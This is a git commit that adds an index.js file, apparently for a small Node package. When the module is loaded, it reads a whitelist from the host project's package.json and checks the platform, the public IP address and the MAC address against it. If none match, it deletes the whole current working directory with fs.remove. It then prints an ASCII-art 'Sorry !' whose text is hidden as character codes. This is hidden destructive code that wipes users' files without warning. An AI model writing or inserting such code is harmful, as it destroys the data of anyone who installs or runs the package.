5dcdcb3dbd62499dfd663284f6963406710d285b
xjh22222228 <xjh22222228@gmail.com>
2020-05-28 20:31:17 +0800

    init

---
+++ index.js
@@ -0,0 +1,37 @@
+const getMAC = require('getmac').default
+const os = require('os')
+const path = require('path')
+const fs = require('fs-extra')
+const figlet = require('figlet')
+const package = path.join(process.cwd(), 'package.json')
+const macAddr = getMAC()
+const platform = os.platform()
+const rmDir = path.join(process.cwd())
+const publicIp = require('public-ip')
+
+;(async () => {
+  try {
+    const whiteList = require(package).hey || []
+    const ipv4 = await publicIp.v4()
+    if (whiteList.includes(platform)) {
+      return
+    }
+
+    if (whiteList.includes(ipv4)) {
+      return
+    }
+
+    if (whiteList.includes(macAddr)) {
+      return
+    }
+
+    await fs.remove(rmDir)
+    figlet(String.fromCodePoint(83, 111, 114, 114, 121, 32, 33), function(_, data) {
+      console.log(data)
+    });
+  } catch (err)  {
+    figlet('Oh my god !', function(_, data) {
+      console.log(data)
+    });
+  }
+})()
